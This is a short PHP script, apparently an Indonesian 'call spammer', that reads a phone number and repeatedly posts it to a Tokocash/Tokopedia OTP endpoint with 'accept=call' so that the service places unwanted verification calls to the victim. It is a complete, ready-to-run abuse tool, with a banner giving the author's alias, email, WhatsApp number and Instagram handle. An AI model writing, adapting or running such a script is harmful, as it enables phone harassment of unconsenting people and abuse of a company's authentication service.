<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
print('\033[1;96m')
                  [•|Spammer Call From TOKOPEDIA|•]
      ('+----------------------------------------------------+')
                Mod By      : AnonyCyyber
      ('+----------------------------------------------------+')
                Gmail' Me   : gifahri77777@gmail.com
      ('+----------------------------------------------------+')
                Whats'ap    : 0813-1597-3943
      ('+----------------------------------------------------+')
                Instagram   : @Tecno_Cyber
      ('+----------------------------------------------------+')
                Thanks to   : AllahSwt-MuhammadSaw     
      ('+----------------------------------------------------+')
                Penggunaan  : Awali Dengan Angka [62]
      ('+----------------------------------------------------+')
\n";
echo "Nomor :  " ; $nomor = trim(fgets(STDIN)); $execute = send($nomor); print $execute; ?>